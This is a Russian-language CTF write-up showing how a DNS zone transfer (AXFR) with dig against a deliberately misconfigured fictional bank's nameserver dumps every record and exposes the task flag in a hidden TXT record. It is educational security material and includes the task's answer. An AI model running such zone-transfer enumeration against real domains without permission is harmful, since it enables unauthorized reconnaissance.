# DNS-сервера: Write-up

Давайте подумаем: что такого страшного может быть в DNS-сервере? Кажется, первое, что приходит в голову — возможность получить все записи в зоне.

Первое, что можем попробовать сделать — `ANY`-запрос. Однако, ничего более интересного, чем флаг к таску __Послание сисадмина__ мы не найдем.

Погуглив, натыкаемся, например, на [ответ на stackoverflow](https://stackoverflow.com/a/19324947) или что-то аналогичное. Там рассказывается про возможность трансфера зоны (`AXFR`-запрос) и про то, что `these are typically restricted and not available unless you control the zone`. Но вы видели где-нибудь в нашем банке что-то restricted?

Надо подобрать правильный DNS-сервер, который разрешает всем трансфер зоны, но в этом ничего сложного — выясняется, что оба авторитативных сервера `ns1.bankbank.exposed` и `ns2.bankbank.exposed` просто указывают на один и тот же IP.

```
$ dig IN AXFR @ns1.bankbank.exposed bankbank.exposed

bankbank.exposed.       2560    IN      SOA     ns1.bankbank.exposed. hostmaster.bankbank.exposed. 1550888583 600 300 1048576 2560
bankbank.exposed.       1200    IN      NS      ns1.bankbank.exposed.
bankbank.exposed.       1200    IN      NS      ns2.bankbank.exposed.
bankbank.exposed.       300     IN      A       95.179.139.209
www.bankbank.exposed.   300     IN      A       95.179.139.209
jobs.bankbank.exposed.  300     IN      A       95.179.139.209
qr.bankbank.exposed.    300     IN      A       95.179.139.209
random.bankbank.exposed. 300    IN      A       95.179.139.209
store.bankbank.exposed. 300     IN      A       95.179.139.209
litsec.bankbank.exposed. 300    IN      A       95.179.139.209
earn.bankbank.exposed.  300     IN      A       95.179.139.209
ns1.bankbank.exposed.   300     IN      A       95.179.139.209
ns2.bankbank.exposed.   300     IN      A       95.179.139.209
botapi.bankbank.exposed. 300    IN      A       95.179.139.209
bankbank.exposed.       300     IN      MX      10 mx.yandex.net.
bankbank.exposed.       300     IN      TXT     "yandex-verification: 70ddd42d9c7067ef"
bankbank.exposed.       300     IN      TXT     "v=spf1 redirect=_spf.yandex.net ~all"
mail._domainkey.bankbank.exposed. 300 IN TXT    "v=DKIM1; k=rsa; t=s; p=MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDUwGoNveBrd82bnyKs9Nk8z1p7sqiMVfRNhZCQWAq79a0VIibyBft4Pz7SAqFmsNvs" "7TNgZ6kCfYp88ZPFbkntUP8YS9rvuPSMPZTZhQk97vZUfnKklRFZqIFk6UfgzxzwuEx1A9PNUXwUdNXkzpDVKY422B5Ioxqun0jGzLR9MwIDAQAB"
bankbank.exposed.       300     IN      TXT     "uctf_digg3r_3xp3rt_or_n0t"
totallysecret-64354262612.bankbank.exposed. 300 IN TXT "uctf_r341_digg3r_3xp3rt"
bankbank.exposed.       2560    IN      SOA     ns1.bankbank.exposed. hostmaster.bankbank.exposed. 1550888583 600 300 1048576 2560
```

Флаг: **uctf_r341_digg3r_3xp3rt**
